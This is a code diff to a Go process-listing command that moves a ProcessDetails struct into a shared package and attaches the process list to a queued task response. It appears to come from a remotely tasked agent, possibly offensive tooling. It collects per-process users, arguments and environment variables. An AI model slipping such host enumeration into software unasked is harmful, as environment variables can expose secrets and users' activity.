@@ -57,21 +57,7 @@ type Process interface {
 
 //ProcessArray - struct that will hold all of the Process results
 type ProcessArray struct {
-	Results []ProcessDetails `json:"Processes"`
-}
-
-type ProcessDetails struct {
-	ProcessID           int                    `json:"process_id"`
-	ParentProcessID     int                    `json:"parent_process_id"`
-	Arch                string                 `json:"architecture"`
-	User                string                 `json:"user"`
-	BinPath             string                 `json:"bin_path"`
-	Arguments           []string               `json:"args"`
-	Environment         map[string]interface{} `json:"env"`
-	SandboxPath         string                 `json:"sandboxpath"`
-	ScriptingProperties map[string]interface{} `json:"scripting_properties"`
-	Name                string                 `json:"name"`
-	BundleID            string                 `json:"bundleid"`
+	Results []structs.ProcessDetails `json:"Processes"`
 }
 
 //Run - interface method that retrieves a process list
@@ -90,11 +76,11 @@ func Run(task structs.Task) {
 		return
 	}
 	_ = json.Unmarshal([]byte(task.Params), &params)
-	var slice []ProcessDetails
+	var slice []structs.ProcessDetails
 	if params.RegexFilter == "" {
 		// Loop over the process results and add them to the json object array
 		for i := 0; i < len(procs); i++ {
-			slice = append(slice, ProcessDetails{
+			slice = append(slice, structs.ProcessDetails{
 				ProcessID:           procs[i].Pid(),
 				ParentProcessID:     procs[i].PPid(),
 				Arch:                procs[i].Arch(),
@@ -111,7 +97,7 @@ func Run(task structs.Task) {
 	} else {
 		for i := 0; i < len(procs); i++ {
 			if exists, _ := regexp.Match(params.RegexFilter, []byte(procs[i].Name())); exists {
-				slice = append(slice, ProcessDetails{
+				slice = append(slice, structs.ProcessDetails{
 					ProcessID:           procs[i].Pid(),
 					ParentProcessID:     procs[i].PPid(),
 					Arch:                procs[i].Arch(),
@@ -142,6 +128,7 @@ func Run(task structs.Task) {
 	}
 	msg.Completed = true
 	msg.UserOutput = string(jsonProcs)
+	msg.Processes = slice
 	resp, _ := json.Marshal(msg)
 	mu.Lock()
 	profiles.TaskResponses = append(profiles.TaskResponses, resp)
